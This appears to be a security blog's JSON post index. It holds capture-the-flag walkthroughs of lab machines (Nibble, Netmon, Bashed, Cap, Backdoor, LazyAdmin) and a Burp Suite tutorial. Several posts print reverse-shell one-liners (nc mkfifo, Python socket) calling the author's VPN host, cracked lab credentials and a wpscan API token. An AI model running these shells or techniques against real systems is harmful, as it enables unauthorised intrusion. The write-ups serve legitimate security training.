[{"content":" Knowledge Gained ðŸ™‰  sudo gobuster   Enumeration First, we start off a rustscan scan and the scan returned 2 open ports, port 22 SSH and port 80 HTTP.\nrustscan -a 10.10.10.75 I visited the HTTP server and its just a empty page with one line of text.\nI then checked the source code of the website and found that theres a line of commented code pointing to /nibbleblog\nI then followed to visit the page and it seems like a blog page.\nNext, I ran gobuster to find for more directories. There are a few interesting sub-directories..\ngobuster dir -u http://10.10.10.75/nibbleblog -t 40 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt Foothold I first visited the admin.php page, seems like a login page for the admin panel. I tried the default creds for nibbleblog, but none of them worked.\nI then move on to the /content page and found something interesting. Under the /private/user.xml file, there is some info about the user account. It seems like the username of the account is admin.\nNow we need admin credentials. When Iâ€™m presented with an enter credentials page, the first thing I try is common credentials (admin/admin, admin/nibbles, nibbles/nibbles, nibbles/admin). If that doesnâ€™t work out, I look for default credentials online that are specific to the technology. Last, I use a password cracker if all else fails. In this case, the common credentials admin:nibbles worked!\nNext, I searched and see if I could find any exploit related to nibbleblog, and I found one exploit that we could possibly use.\nAccording to the exploit, we could upload a php shell through the image plugins, so I followed the POC and uploaded a reverse PHP shell I got from pentestmonkey\nThen I set up a listener and invoke the reverse shell. BOOOM! We got a reverse shell back!\nWhile getting the user flag, I noticed there is a personal.zip file in the user directory also. I unzip the file and found a script inside. After using sudo -l , it appears that we can run this script as sudo! So what we need to do next is just replace the monitor.sh script with a reverse shell code.\nI replaced the monitor.sh file with the code I got from pentestmonkey also:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.8 9002 \u0026gt;/tmp/f And thats it, we have succesfully rooted this box!\nThats all for this box, thanks for reading!\n","permalink":"http://tylerwcs.github.io/blog/posts/nibble/","summary":"Knowledge Gained ðŸ™‰  sudo gobuster   Enumeration First, we start off a rustscan scan and the scan returned 2 open ports, port 22 SSH and port 80 HTTP.\nrustscan -a 10.10.10.75 I visited the HTTP server and its just a empty page with one line of text.\nI then checked the source code of the website and found that theres a line of commented code pointing to /nibbleblog","title":"Nibble [HTB Walkthrough]"},{"content":" Knowledge Gained ðŸ™‰  psexec Windows File System   Enumeration First off, we scan the machine and noticed a lot of ports opened. WinRM (Windows Remote Management) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it\u0026rsquo;s utilising WMI, so you can think of it as an HTTP based API for WMI.\nI first start off with the ftp server and check if the server allows anonymous acces. And it does!\nSuprisingly, the user flag is get right there! I downloaded it using the get command.\nAfter that, I move on to the website, the website is a monitor program that needs login.\nI then googled for default creds for the program, and found one default creds. But unfortunately, the default creds did not work.\nThen, I thought that since I have access to the ftp server, maybe I can view the configuration files/ database files for the program. So, I searched up where does the config/database files are stored. So it is stored at \\ProgramData\\Paessler\\PRTG Network Monitor\nI then use the ftp server to access the location and found 3 config files inside. I downloaded them all to my local machine to take a look at whats inside.\nIn the PRTG Configuration.old.bak file, theres a set of credentials in it! I grabbed the creds and use it on the login page. Suprisingly, it did not work.\nThe is where a little bit of creativity is needed. As this file is a old backup file from 2018, most likely the password is out of date. So the user might changed it to another date such as PrTg@dmin2019\n And it worked! The correct creds is prtgadmin:PrTg@dmin2019\n Foothold During enumeration phase, I noticed that there is one exploit for the PRTG program, that is the Authenticated RCE exploit. I looked it up using searchploit and copied it down to my machine.\nI ran the script and it worked!\n Privilege Escalation I then use psexec.py with the creds we have and we are root!\nThats all for this machine, thanks for reading!\n","permalink":"http://tylerwcs.github.io/blog/posts/netmon/","summary":"Knowledge Gained ðŸ™‰  psexec Windows File System   Enumeration First off, we scan the machine and noticed a lot of ports opened. WinRM (Windows Remote Management) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it\u0026rsquo;s utilising WMI, so you can think of it as an HTTP based API for WMI.\nI first start off with the ftp server and check if the server allows anonymous acces.","title":"Netmon [HTB Walkthrough]"},{"content":" Knowledge Gained ðŸ™‰  su   Enumeration First, we start off with a rustscan scan, seems that this box only have one open port which is port 80.\nrustscan -a 10.10.10.68 I then move to the website and nothing much was on the website.\nThen, I run gobuster to search for sub-directories under this server. The results returns a few interesting results: /php , /dev , /uploads\n Foothold Both /php and /uploads have nothing inside, so I move on to /dev. Under this there is a php file called phpbash.php, and it appears to be a terminal. I can access the terminal using the www-data user and the user flag is just there for us.\nBefore I proceed, I upgraded the shell to have more control of the machine. The shell I used is from PentestMonkey\npython -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.14.13\u0026#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;  Priv Esc After moving around the terminal, I run sudo -l to see what privileges we have. Seems like the www-data user can run commands as scriptmanager user.\nsudo -u scriptmanager /bin/bash After poking around, I noticed that there is a folder under the root directory named scripts that is owned by the scriptmanager user.\nUnder that folder there is a script and a text file. Seems like the script is opening and writing to the file. Noticing the creation time of the text file, I know that there must be some cron running the script in the background automatically every minute.\nSo next all we have to do is replace the script with a reverse shell and we are root!\necho \u0026#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\u0026#34;10.10.14.13\\\u0026#34;,9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\u0026#34;/bin/sh\\\u0026#34;,\\\u0026#34;-i\\\u0026#34;]);\u0026#34; \u0026gt; test.py Thats all for this box, thanks for reading!\n","permalink":"http://tylerwcs.github.io/blog/posts/bashed/","summary":"Knowledge Gained ðŸ™‰  su   Enumeration First, we start off with a rustscan scan, seems that this box only have one open port which is port 80.\nrustscan -a 10.10.10.68 I then move to the website and nothing much was on the website.\nThen, I run gobuster to search for sub-directories under this server. The results returns a few interesting results: /php , /dev , /uploads\n Foothold Both /php and /uploads have nothing inside, so I move on to /dev.","title":"Bashed [HTB Walkthrough]"},{"content":" Knowledge Gained ðŸ™‰  GTFObins wireshark capabilities   Enumeration First we did a rustscan + nmap scan, which found 3 ports, SSH, FTP, and HTTP.\nrustscan -a 10.10.10.245 Next I run gobuster to find sub directories for the website. Nothing much is interesting.\ngobuster dir -u http://10.10.10.245 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100  Foothold When I browse around the website, I noticed that the only one interesting page is the data page. It seems to include a pcap file that it capture.\nI then noticed that the url shows a ID number at the end, so I played with it a bit and found out that if I change the ID num to 0, a very interesting capture shows up.\nI then downloaded the file and open in up with wireshark and found some creds inside!\nI then use the creds to connect to SSH and it worked!\n Privilege Escalation After I took the user flag, I then move on to priv esc. I used Linpeas to enumerate the machine, and found one interesting point. It appears the /usr/bin/python3.8 binary has the cap_setuid capability enabled.\nSo I went to GTFObins to find some more info and upon consulting GTFOBins, it appears this can be exploited, as it practically works in the same way as SETUID:\nRunning the command mentioned above and we gain root-level privileges.\nThats all for this box, thanks for reading!\n","permalink":"http://tylerwcs.github.io/blog/posts/cap/","summary":"Knowledge Gained ðŸ™‰  GTFObins wireshark capabilities   Enumeration First we did a rustscan + nmap scan, which found 3 ports, SSH, FTP, and HTTP.\nrustscan -a 10.10.10.245 Next I run gobuster to find sub directories for the website. Nothing much is interesting.\ngobuster dir -u http://10.10.10.245 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100  Foothold When I browse around the website, I noticed that the only one interesting page is the data page.","title":"Cap [HTB Walkthrough]"},{"content":" Knowledge Gained ðŸ™‰  LFI and Directory Traversal gdbserver screen rustscan wpscan   Enumeration In this machine, I learned a new way to scan for open ports, that is using rustscan. It took less than few seconds for it to find the ports open and it also runs nmap automatically. The scan shows that we have 3 open ports running, port 22, 80 and 1337.\nFirst I took a look at the port 80 website, it shows that it is a website built using Wordpress, therefore we can run wpscan to enumerate more infos about the website. There are lots of WP plugins that are vulnerable, so we can try if we can find any vulnerable ones.\nwpscan --url http://backdoor.htb/ Looks like we have found nothing interesting from the scan, there are no plugins found(via passive mode), but theres is another way of finding plugins that is using aggresive mode. But before we can use that mode, we need to singup to wpscan in order to get the api-token. After using the api-token, we can see more results from the wpscan, we have found one plugins that is vulnerable, and one user named admin.\nwpscan --url http://backdoor.htb/ --api-token G4Zkc6WaaftaniPUQYnDEdV6JxwdK7eo0oj2YkI9Jrw -e p,u --plugins-detection aggressive Following the plugins, we have found another plugins named ebook in the plugins page. Looking through the readme.txt we know that the version is 1.1 and it is vulnerable.\nLooking at the exploit, it seems to be a Directory Traversal vulnerability, which can allow us to read files from the url itself.\nAfter looking at the contents of the wp-config.php file, I found some creds!\nHowever, I tried logging in using the creds but nothing worked.\nI then tried listing other files that are interesting like the /etc/passwd file, but nothing interesting.\n Foothold Since there is a port 1337 listening, I decided to try enumerating processes. So, /proc/[PID]/cmdline in Linux is basically representing a currently running process. More on the article here.\n I used wfuzz to bruteforce through the PID and got back 4 processes. Wfuzz is based on a simple concept: it replaces any reference to the FUZZ keyword by the value of a given payload.\nwfuzz -u http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline -z range,1-1000 --hw 1 I then listed out all the PIDs and see what are they running.\nOn** PID 822**, there is a gdbserver running on port 1337, that might be the one we are looking for. So I searched up the exploit and found one here using metasploit.\nI run the exploit and got a shell back. I then access the user flag.\n Priv Esc I used LinPeas to do more enumeration on the machine, then I found something interesting, a screen process is running as root.\nAfter doing some research, I found out that I can use the -x command to attach to a session. Since root has already opened a session, I just need to attach to it using the command:\nscreen -x root/root First, we have to set the terminal emulator to Linux by using export TERM=xterm. You can check your TERM setting by running echo $TERM. Now just run the screen command as shown.\nAnd thats all for this machine, thanks for reading!\n","permalink":"http://tylerwcs.github.io/blog/posts/third/","summary":"Knowledge Gained ðŸ™‰  LFI and Directory Traversal gdbserver screen rustscan wpscan   Enumeration In this machine, I learned a new way to scan for open ports, that is using rustscan. It took less than few seconds for it to find the ports open and it also runs nmap automatically. The scan shows that we have 3 open ports running, port 22, 80 and 1337.\nFirst I took a look at the port 80 website, it shows that it is a website built using Wordpress, therefore we can run wpscan to enumerate more infos about the website.","title":"Backdoor [HTB Walkthrough]"},{"content":"LazyAdmin is a easy rated box on THM. It is a good box to brush up my skills and I learned a lot from it.\n Enumeration First, I run a Nmap scan and 2 open ports are found: port 80 and port 22\nnmap --top-ports 50 10.10.127.148  Then, I run a gobuster scan to search for other subdirectories, and I found a /content subdirectory page.\n Exploitation I visit the page and found something new: SweetRice CMS.\nI then use searchsploit to find vulnerabilities related to this program, and I found quite a lot of them. The interesting ones are the Arbitrary File Upload and the PHP Code Execution.\nLooking at the payload, it requires credentials in order to upload the file, so I had to find a way to find creds.\nAfter poking around, I cant find anything, so I run another gobuster scan on the /content directory. It turns out, the real thing is inside here.\nI went to check the /inc sub directory, and it had lots of files in it, but one file is super interesting: mysql_backup/\nBOOOM! There are creds inside the backup file.But the password seems to be encrypted.\nSo I went to decrypt the password and got the plaintext: Password123\nI quickly went back to the exploit and key in all the creds along with the reverse shell I made from pentestmonkey. But I cant seem to get it to work\u0026hellip;\nI was quite stuck at this moment.. then I looked back my scans and see if theres anything more left, and I found out that the /as page was the login panel for the website!\nI then key in my creds and logged in to the website. manager:Password123\nI then poked around and found out that the Ads section can allow me to inject code. I then copied the reverse shell PHP code from pentestmonkey and edit it with my own IP address and port.\nThen I went back to the /inc page and access my shell there..\nAnd then BOOM, I got a shell back!\nI quickly get the user.txt file and submit it.\n Privilege Escalation The fastest way to priv esc is to use sudo -l, and indeed it listed something we can use. We can run the backup.pl script as root, so all we have to do is replace the content of the script and run it as sudo.\nReplace the file content with a reverse shell and run the script using sudo.\nAnd BOOOM, we are root!\n That\u0026rsquo;s it for this box, thanks for reading!\n","permalink":"http://tylerwcs.github.io/blog/posts/second/","summary":"LazyAdmin is a easy rated box on THM. It is a good box to brush up my skills and I learned a lot from it.\n Enumeration First, I run a Nmap scan and 2 open ports are found: port 80 and port 22\nnmap --top-ports 50 10.10.127.148  Then, I run a gobuster scan to search for other subdirectories, and I found a /content subdirectory page.\n Exploitation I visit the page and found something new: SweetRice CMS.","title":"LazyAdmin [THM Walkthrough]"},{"content":"What is Burp Suite? Burpsuite is a framework that aids in web application penetration testing. Burp Suite is also very commonly used when assessing mobile applications, as the same features which make it so attractive for web app testing translate almost perfectly into testing the APIs powering most mobile apps.\nWhilst Burp Community has a relatively limited feature-set compared to the Professional edition, it still has many superb tools available. These include:\n Proxy : The most well-known aspect of Burp Suite, the Burp Proxy allows us to intercept and modify requests/responses when interacting with web applications.    Repeater : The second most well-known Burp feature \u0026ndash; Repeater \u0026ndash; allows us to capture, modify, then resend the same request numerous times. This feature can be absolutely invaluable, especially when we need to craft a payload through trial and error (e.g. in an SQLi \u0026ndash; Structured Query Language Injection) or when testing the functionality of an endpoint for flaws.    Intruder : Intruder allows us to spray an endpoint with requests. This is often used for bruteforce attacks or to fuzz endpoints.    Decoder : Decoder provides a valuable service when transforming data \u0026ndash; either in terms of decoding captured information, or encoding a payload prior to sending it to the target.    Comparer : As the name suggests, Comparer allows us to compare two pieces of data at either word or byte level.    Sequencer : We usually use Sequencer when assessing the randomness of tokens such as session cookie values or other supposedly random generated data. If the algorithm is not generating secure random values, then this could open up some devastating avenues for attack.    Burp Proxy The Burp Proxy is the most fundamental (and most important!) of the tools available in Burp Suite. It allows us to capture requests and responses between ourselves and our target. These can then be manipulated or sent to other tools for further processing before being allowed to continue to their destination.\nFor example, if we make a request to https://tryhackme.com through the Burp Proxy, our request will be captured and won\u0026rsquo;t be allowed to continue to the TryHackMe servers until we explicitly allow it through. We can choose to do the same with the response from the server, although this isn\u0026rsquo;t active by default. This ability to intercept requests ultimately means that we can take complete control over our web traffic \u0026ndash; an invaluable ability when it comes to testing web applications.\nIt can get extremely tedious having Burp capturing all of our traffic. When it logs everything (including traffic to sites we aren\u0026rsquo;t targeting), it muddies up logs we may later wish to send to clients. In short, allowing Burp to capture everything can quickly become a massive pain.\nWhat\u0026rsquo;s the solution? Scoping.\nSetting a scope for the project allows us to define what gets proxied and logged. We can restrict Burp Suite to only target the web application(s) that we want to test. The easiest way to do this is by switching over to the Target tab, right-clicking our target from our list on the left, then choosing Add To Scope. Burp will then ask us whether we want to stop logging anything which isn\u0026rsquo;t in scope \u0026ndash; most of the time we want to choose \u0026ldquo;yes\u0026rdquo;.\nWe just chose to disable logging for out of scope traffic, but the proxy will still be intercepting everything. To turn this off, we need to go into the Proxy Options sub-tab and select \u0026ldquo;And URLIs in target scope\u0026rdquo; from the Intercept Client Requests section:\nWith this option selected, the proxy will completely ignore anything that isn\u0026rsquo;t in the scope, vastly cleaning up the traffic coming through Burp.\n Burp Repeater Repeater allows us to craft or relay intercepted requests to a target at will. It means we can take a request captured in the Proxy, edit it, and send the same request repeatedly as many times as we wish.\nThis ability to edit and resend the same request multiple times makes Repeater ideal for any kind of manual poking around at an endpoint, providing us with a nice Graphical User Interface (GUI) for writing the request payload and numerous views of the response so that we can see the results of our handiwork in action.\nIf we want to change anything about the request, we can simply type in the Request window and press \u0026ldquo;Send\u0026rdquo; again; this will update the Response on the right.\n Burp Intruder Intruder is Burp Suite\u0026rsquo;s in-built fuzzing tool. It allows us to take a request and use it as a template to send many more requests with slightly altered values automatically.\nFor example, by capturing a request containing a login attempt, we could then configure Intruder to swap out the username and password fields for values from a wordlist, effectively allowing us to bruteforce the login form. Similarly, we could pass in a fuzzing[1] wordlist and use Intruder to fuzz for subdirectories, endpoints, or virtual hosts. This functionality is very similar to that provided by command-line tools such as Wfuzz or Ffuf.\nThere are four other Intruder sub-tabs:\n Positions allows us to select an Attack Type, as well as configure where in the request template we wish to insert our payloads.    Payloads allows us to select values to insert into each of the positions we defined in the previous sub-tab. For example, we may choose to load items in from a wordlist to serve as payloads. How these get inserted into the template depends on the attack type we chose in the Positions tab. There are many payload types to choose from (anything from a simple wordlist to regexes based on responses from the server). The Payloads sub-tab also allows us to alter Intruder\u0026rsquo;s behaviour with regards to payloads; for example, we can define pre-processing rules to apply to each payload (e.g. add a prefix or suffix, match and replace, or skip if the payload matches a defined regex).    Resource Pool is not particularly useful to us in Burp Community. It allows us to divide our resources between tasks. Burp Pro would allow us to run various types of automated tasks in the background, which is where we may wish to manually allocate our available memory and processing power between these automated tasks and Intruder. Without access to these automated tasks, there is little point in using this, so we won\u0026rsquo;t devote much time to it.    As with most of the other Burp tools, Intruder allows us to configure attack behaviour in the Options sub-tab. The settings here apply primarily to how Burp handles results and how Burp handles the attack itself. For example, we can choose to flag requests that contain specified pieces of text or define how Burp responds to redirect (3xx) responses.  When we are looking to perform an attack with Intruder, the first thing we need to do is look at positions. Positions tell Intruder where to insert payloads.\nNotice that Burp will attempt to determine the most likely places we may wish to insert a payload automatically \u0026ndash; these are highlighted in green and surrounded by silcrows (Â§).\nThere are 4 attack types:\n Sniper - One set of payload. Intruder will take each position and substitute each payload into it in turn. Good for single-position attacks. E.g. password   Battering Ram - One set of payload. Puts the same payload in every position rather than in each position in turn.    Pitchfork - One set of payload per position. It\u0026rsquo;s like having numerous Sniper running simultaneously. This attack type is exceptionally useful when forming things like credential stuffing attacks.\n This type of attack can take a little time to get your head around, so let\u0026rsquo;s use our bruteforce example from before, but this time we need two wordlists:\n  Our first wordlist will be usernames. It contains three entries: joel, harriet, alex.\n  Let\u0026rsquo;s say that Joel, Harriet, and Alex have had their passwords leaked: we know that Joel\u0026rsquo;s password is J03l, Harriet\u0026rsquo;s password is Emma1815, and Alex\u0026rsquo;s password is Sk1ll.\n      Cluster Bomb - Multiple payload sets: one per position. Cluster bomb iterates through each payload set individually, making sure that every possible combination of payloads is tested.\n Let\u0026rsquo;s use the same wordlists as before:\n  Usernames: joel, harriet, alex.\n  Passwords: J03l, Emma1815, Sk1ll.\n    But, this time, let\u0026rsquo;s assume that we don\u0026rsquo;t know which password belongs to which user. We have three users and three passwords, but we don\u0026rsquo;t know how to match them up. In this case, we would use a cluster bomb attack; this will try every combination of values. The request table for our username and password positions looks something like this:\n Burp Decoder The Burp Suite Decoder module allows us to manipulate data. As the name suggests, we can decode information that we capture during an attack, but we can also encode data of our own, ready to be sent to the target. Decoder also allows us to create hashsums of data, as well as providing a Smart Decode feature which attempts to decode provided data recursively until it is back to being plaintext (like the \u0026ldquo;Magic\u0026rdquo; function of Cyberchef).\n Burp Comparer As the name suggests, Comparer allows us to compare two pieces of data, either by ASCII words or by bytes.\n Burp Sequencer Sequencer is one of those tools that rarely ever gets used in CTFs and other lab environments but is an essential part of a real-world web app penetration test. In short, Sequencer allows us to measure the entropy (or randomness, in other words) of \u0026ldquo;tokens\u0026rdquo; \u0026ndash; strings that are used to identify something and should, in theory, be generated in a cryptographically secure manner.\nFor example, we may wish to analyse the randomness of a session cookie or a Cross-Site Request Forgery (CSRF) token protecting a form submission. If it turns out that these tokens are not generated securely, then we can (in theory) predict the values of upcoming tokens. Just imagine the implications of this if the token in question is used for password resets\u0026hellip;\nThere are two main methods we can use to perform token analysis with Sequencer:\n Live capture is the more common of the two methods \u0026ndash; this is the default sub-tab for Sequencer. Live capture allows us to pass a request to Sequencer, which we know will create a token for us to analyse. For example, we may wish to pass a POST request to a login endpoint into Sequencer, as we know that the server will respond by giving us a cookie. With the request passed in, we can tell Sequencer to start a live capture: it will then make the same request thousands of times automatically, storing the generated token samples for analysis. Once we have accumulated enough samples, we stop Sequencer and allow it to analyse the captured tokens.    Manual load allows us to load a list of pre-generated token samples straight into Sequencer for analysis. Using Manual Load means we don\u0026rsquo;t have to make thousands of requests to our target (which is both loud and resource intensive), but it does mean that we need to obtain a large list of pre-generated tokens!   Burp Extender The Burp App Store (or BApp Store for short) gives us a way to easily list official extensions and integrate them seamlessly with Burp Suite. Extensions can be written in a variety of languages \u0026ndash; most commonly Java (which integrates into the framework automatically) or Python (which requires the Jython interpreter).\n   ","permalink":"http://tylerwcs.github.io/blog/posts/first/","summary":"What is Burp Suite? Burpsuite is a framework that aids in web application penetration testing. Burp Suite is also very commonly used when assessing mobile applications, as the same features which make it so attractive for web app testing translate almost perfectly into testing the APIs powering most mobile apps.\nWhilst Burp Community has a relatively limited feature-set compared to the Professional edition, it still has many superb tools available. These include:","title":"Burp Suite"}]